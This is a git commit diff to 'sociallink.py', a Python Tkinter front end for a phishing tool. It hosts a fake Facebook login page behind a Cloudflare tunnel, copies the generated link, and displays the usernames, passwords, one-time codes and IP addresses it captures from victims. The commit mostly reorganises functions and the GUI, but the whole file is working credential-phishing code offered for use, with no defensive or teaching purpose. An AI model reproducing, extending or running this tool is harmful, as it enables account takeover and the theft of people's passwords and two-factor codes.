cf978efff2b6abf7c4d59f28a8dc3e729ba23bb3
Rupesh <rupesh54321kumar@gmail.com>
2022-04-17 17:40:35 +0000

    updated

--- sociallink.py
+++ sociallink.py
@@ -77,8 +77,7 @@ def sites():
 		closeall=Button(root4, text="Exit all",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command= destroy).grid(row=6, column=2),
 		root4.mainloop()
 	def fishfacebook():		
-		def ffacebook():
-			os.system("cd assets/sites/facebook; hostit -f cloudflare 8080 --silent> ../../../process/link.txt 2>&1; grep -o 'https://[-0-9a-z]*\.trycloudflare.com' '../../../process/link.txt' > ../../../process/new.txt; rm ../../../process/link.txt")
+		link = os.system("cd assets/sites/facebook; hostit -f cloudflare 8080 --silent> ../../../process/link.txt 2>&1; grep -o 'https://[-0-9a-z]*\.trycloudflare.com' '../../../process/link.txt' > ../../../process/new.txt; rm ../../../process/link.txt")
 		def capture():
 			file_size = os.path.getsize('assets/sites/facebook/log.txt')
 			while True:
@@ -90,6 +89,10 @@ def sites():
 			g= open('process/username.txt', 'r')	 
 			unameplace.delete(0, END)
 			unameplace.insert(INSERT, g.read())
+		def pwget():
+			h = open("process/password.txt")
+			pwarea.delete(0, END)
+			pwarea.insert(INSERT, h.read())
 		def copying(event):
 			copybutton.config(text="copied link",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN)
 			copier = Tk()
@@ -99,10 +102,10 @@ def sites():
 			copier.clipboard_append(r.read())
 			copier.update()
 			copier.destroy()
-		def pwget():
-			h = open("process/password.txt")
-			pwarea.delete(0, END)
-			pwarea.insert(INSERT, h.read())
+		def destroy():
+			root.destroy()
+			root1.destroy()
+			root3.destroy()		
 		def otpget():
 			i = open("process/otp.txt")
 			otparea.delete(0, END)
@@ -110,20 +113,18 @@ def sites():
 		def ipfinder():
 			j = open("process/ip.txt")
 			ipplace.delete(0, END)
-			ipplace.insert(INSERT, j.read())
-		def destroy():
-			root.destroy()
-			root1.destroy()
-			root3.destroy()	
+			ipplace.insert(INSERT, j.read())	
 		root3 = Tk()
-		root3.title("Facebook link")
-		root3.geometry("800x300+400+430")
-		copyplace = Label(root3,text="click copy link to copy generated link", width=60, font="Calibri 10")
+		root3.title("facebook link")
+		
+		copyplace = Entry(root3, width=60, font="Calibri 10")
 		copyplace.grid(row=0,column=2)
-		copybutton = Button(root3,text="copy link",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command=ffacebook)
+		copyplace.insert(INSERT, "click copy link to get link")	
+		copybutton = Button(root3,text="copy button",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN)
 		copybutton.bind('<Enter>', copying)
 		copybutton.grid(row=0, column=0)
-		listener = Button(root3, text="start capturing", font=('Times New Roman', 18,'bold'), bg="blue", fg="yellow", state="normal", activebackground="pink", activeforeground="red", cursor="hand2", relief=SUNKEN, command=capture).grid(row=1,column=0)
+		
+		listener = Button(root3, text="start capturing",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command=capture).grid(row=1,column=0)
 	
 		ip = Button(root3,text="ip",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command= ipfinder)
 		ip.grid(row=2, column=0)
@@ -148,8 +149,7 @@ def sites():
 		otparea = Entry(root3, width=60, font="Calibri 10")
 		otparea.grid(row=5,column=2)
 		otparea.insert(INSERT, "click OTP to update")
-		
-		closeall=Button(root3, text="Exit all",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command= destroy).grid(row=6, column=2)
+		closeall=Button(root3, text="Exit all",font=('Times New Roman', 18,'bold'), bg="purple", fg="yellow", state="normal", activebackground="blue", activeforeground="red", cursor="hand2", relief=SUNKEN, command= destroy).grid(row=6, column=2),
 		root3.mainloop()
 	root1 = Tk()
 	root1.geometry('500x100+500+760')
